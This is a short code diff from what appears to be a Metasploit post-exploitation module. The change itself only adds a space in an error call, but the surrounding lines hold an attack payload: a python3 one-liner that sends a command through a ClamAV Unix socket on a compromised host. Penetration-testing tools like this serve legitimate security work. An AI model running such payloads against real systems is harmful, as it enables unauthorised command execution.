@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Post
       print_good('python3 exists')
       payload = "python3 -c \"import socket; sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); sock.connect('#{clamav_socket}'); sock.send('#{cmd}'.encode());\""
     else
-      fail_with(Failure::NotFound,'No suitable binary found on the target host. Quitting!')
+      fail_with(Failure::NotFound, 'No suitable binary found on the target host. Quitting!')
     end
 
     print_status("Checking file path #{clamav_socket} exists and is writable... ")
